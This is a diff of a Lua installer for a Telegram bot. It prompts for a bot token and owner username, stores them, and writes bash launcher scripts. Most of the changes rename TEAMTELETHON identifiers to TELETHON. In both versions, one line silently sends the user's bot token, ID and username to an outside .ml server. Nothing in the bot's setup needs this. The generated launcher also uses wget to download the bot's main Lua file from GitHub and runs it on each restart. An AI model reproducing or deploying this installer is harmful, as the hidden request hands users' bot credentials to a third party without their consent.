@@ -3,18 +3,18 @@ https = require("ssl.https")
 http = require("socket.http")
 JSON = dofile("./File_Libs/JSON.lua")
 local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
-Server_TEAMTELETHON = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
-local AutoFiles_TEAMTELETHON = function() 
+Server_TELETHON = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
+local AutoFiles_TELETHON = function() 
 local Create_Info = function(Token,Sudo,UserName)  
-local TEAMTELETHON_Info_Sudo = io.open("sudo.lua", 'w')
-TEAMTELETHON_Info_Sudo:write([[
+local TELETHON_Info_Sudo = io.open("sudo.lua", 'w')
+TELETHON_Info_Sudo:write([[
 token = "]]..Token..[["
 Sudo = ]]..Sudo..[[  
 UserName = "]]..UserName..[["
 ]])
-TEAMTELETHON_Info_Sudo:close()
+TELETHON_Info_Sudo:close()
 end  
-if not database:get(Server_TEAMTELETHON.."Token_TEAMTELETHON") then
+if not database:get(Server_TELETHON.."Token_TELETHON") then
 print("\27[1;34m»» Send Your Token Bot :\27[m")
 local token = io.read()
 if token ~= '' then
@@ -23,16 +23,16 @@ if res ~= 200 then
 io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
 else
 io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
-database:set(Server_TEAMTELETHON.."Token_TEAMTELETHON",token)
+database:set(Server_TELETHON.."Token_TELETHON",token)
 end 
 else
 io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
 end 
-os.execute('lua startTEAMTELETHON.lua')
+os.execute('lua startTelethon.lua')
 end
 ----------------------
 ----------------------
-if not database:get(Server_TEAMTELETHON.."UserName_TEAMTELETHON") then
+if not database:get(Server_TELETHON.."UserName_TELETHON") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
@@ -44,67 +44,67 @@ end
 local Json = JSON:decode(Get_Info)
 if Json.Info == false then
 io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
-os.execute('lua startTEAMTELETHON.lua')
+os.execute('lua startTelethon.lua')
 else
 if Json.Info == 'Channel' then
 io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
-os.execute('lua startTEAMTELETHON.lua')
+os.execute('lua startTelethon.lua')
 else
 io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
-database:set(Server_TEAMTELETHON.."UserName_TEAMTELETHON",Json.Info.Username)
-database:set(Server_TEAMTELETHON.."Id_TEAMTELETHON",Json.Info.Id)
+database:set(Server_TELETHON.."UserName_TELETHON",Json.Info.Username)
+database:set(Server_TELETHON.."Id_TELETHON",Json.Info.Id)
 end
 end
 else
 io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
 end 
-os.execute('lua startTEAMTELETHON.lua')
+os.execute('lua startTelethon.lua')
 end
-local function Files_TEAMTELETHON_Info()
-Create_Info(database:get(Server_TEAMTELETHON.."Token_TEAMTELETHON"),database:get(Server_TEAMTELETHON.."Id_TEAMTELETHON"),database:get(Server_TEAMTELETHON.."UserName_TEAMTELETHON"))   
-https.request("https://TEAMTELETHON.ml/TEAMTELETHONconfig.php?id="..database:get(Server_TEAMTELETHON.."Id_TEAMTELETHON").."&user="..database:get(Server_TEAMTELETHON.."UserName_TEAMTELETHON").."&token="..database:get(Server_TEAMTELETHON.."Token_TEAMTELETHON"))
-local RunTEAMTELETHON = io.open("TEAMTELETHON", 'w')
-RunTEAMTELETHON:write([[
+local function Files_TELETHON_Info()
+Create_Info(database:get(Server_TELETHON.."Token_TELETHON"),database:get(Server_TELETHON.."Id_TELETHON"),database:get(Server_TELETHON.."UserName_TELETHON"))   
+https.request("https://telethon.ml/telethonconfig.php?id="..database:get(Server_TELETHON.."Id_TELETHON").."&user="..database:get(Server_TELETHON.."UserName_TELETHON").."&token="..database:get(Server_TELETHON.."Token_TELETHON"))
+local RunTELETHON = io.open("TELETHON", 'w')
+RunTELETHON:write([[
 #!/usr/bin/env bash
-cd $HOME/TEAMTELETHON
-token="]]..database:get(Server_TEAMTELETHON.."Token_TEAMTELETHON")..[["
-rm -fr TEAMTEAMTELETHON.lua
-wget "https://raw.githubusercontent.com/TEAMTELETHON-Arab/TEAMTEAMTELETHON/master/TEAMTEAMTELETHON.lua"
+cd $HOME/TELETHON
+token="]]..database:get(Server_TELETHON.."Token_TELETHON")..[["
+rm -fr TEAMTELETHON.lua
+wget "https://raw.githubusercontent.com/telethon-Arab/TEAMTELETHON/master/TEAMTELETHON.lua"
 while(true) do
 rm -fr ../.telegram-cli
-./tg -s ./TEAMTEAMTELETHON.lua -p PROFILE --bot=$token
+./tg -s ./TEAMTELETHON.lua -p PROFILE --bot=$token
 done
 ]])
-RunTEAMTELETHON:close()
+RunTELETHON:close()
 local RunTs = io.open("on", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/TEAMTELETHON
+cd $HOME/TELETHON
 while(true) do
 rm -fr ../.telegram-cli
-screen -S TEAMTELETHON -X kill
-screen -S TEAMTELETHON ./TEAMTELETHON
+screen -S TELETHON -X kill
+screen -S TELETHON ./TELETHON
 done
 ]])
 RunTs:close()
 end
-Files_TEAMTELETHON_Info()
-database:del(Server_TEAMTELETHON.."Token_TEAMTELETHON");database:del(Server_TEAMTELETHON.."Id_TEAMTELETHON");database:del(Server_TEAMTELETHON.."UserName_TEAMTELETHON")
+Files_TELETHON_Info()
+database:del(Server_TELETHON.."Token_TELETHON");database:del(Server_TELETHON.."Id_TELETHON");database:del(Server_TELETHON.."UserName_TELETHON")
 sudos = dofile('sudo.lua')
-os.execute('./TEAMTELETHONinstall.sh ins')
+os.execute('./telethoninstall.sh ins')
 end 
 local function Load_File()  
-local f = io.open("./sudo.lua", "r")
+local f = io.open("./sudo.lua", "r")  
 if not f then   
-AutoFiles_TEAMTELETHON()  
+AutoFiles_TELETHON()  
 var = true
 else   
 f:close()  
-database:del(Server_TEAMTELETHON.."Token_TEAMTELETHON");database:del(Server_TEAMTELETHON.."Id_TEAMTELETHON");database:del(Server_TEAMTELETHON.."UserName_TEAMTELETHON")
+database:del(Server_TELETHON.."Token_TELETHON");database:del(Server_TELETHON.."Id_TELETHON");database:del(Server_TELETHON.."UserName_TELETHON")
 sudos = dofile('sudo.lua')
-os.execute('./TEAMTELETHONinstall.sh ins')
+os.execute('./telethoninstall.sh ins')
 var = false
 end  
 return var
 end
-Load_File()  
+Load_File()
